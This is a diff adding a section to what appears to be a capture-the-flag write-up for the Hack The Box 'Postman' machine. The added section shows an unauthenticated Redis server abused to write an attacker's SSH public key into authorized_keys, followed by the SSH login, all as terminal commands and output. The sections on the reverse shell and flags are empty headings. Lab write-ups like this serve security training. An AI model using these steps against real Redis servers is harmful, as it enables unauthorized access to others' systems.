@@ -148,6 +148,52 @@ Next we will add the new endpoint to our /etc/hosts fil
 Lastly, we will enumerate the endpoints on https://postman:10000 with Gobuster.
 
 ## Exploit
+### RCE via redis
+Firstly, we will create our own ssh public-private key pair using ```ssh-keygen -t rsa ```
+
+Next, we will write our public-private keypair to a file and import the file into redis
+```
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ (echo -e "\n\n"; cat rsa.pub; echo -e "\n\n") > spaced_key.txt
+                                                                                           
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key                  148 ⨯ 1 ⚙
+OK
+```
+
+```
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379> 
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop/postman]
+└─$ ssh -i rsa redis@10.10.10.160
+The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
+ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:
+```
 ### Obtaining reverse shell
 ### Obtaining user flag
 ### Obtaining root flag
